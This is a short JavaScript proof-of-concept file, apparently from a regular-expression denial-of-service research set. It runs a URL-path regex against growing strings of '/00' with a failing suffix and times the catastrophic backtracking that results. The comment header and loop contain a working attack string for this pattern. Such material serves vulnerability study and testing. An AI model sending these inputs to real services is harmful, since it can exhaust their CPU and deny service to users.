/* 4181
 * ^(?:(?:\.\./)|/)?(?:\w(?:[\w`~!$=;\-\+\.\^\(\)\|\{\}\[\]]|(?:%\d\d))*\w?)?(?:/\w(?:[\w`~!$=;\-\+\.\^\(\)\|\{\}\[\]]|(?:%\d\d))*\w?)*(?:\?[^#]+)?(?:#[a-z0-9]\w*)?$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+"/00"*32+"◎@! _1_EOA(i or ii)"
 */
var REGEX = new RegExp("^(?:(?:\.\./)|/)?(?:\w(?:[\w`~!$=;\-\+\.\^\(\)\|\{\}\[\]]|(?:%\d\d))*\w?)?(?:/\w(?:[\w`~!$=;\-\+\.\^\(\)\|\{\}\[\]]|(?:%\d\d))*\w?)*(?:\?[^#]+)?(?:#[a-z0-9]\w*)?$")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + '/00'.repeat(i*1) + '◎@! _1_EOA(i or ii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}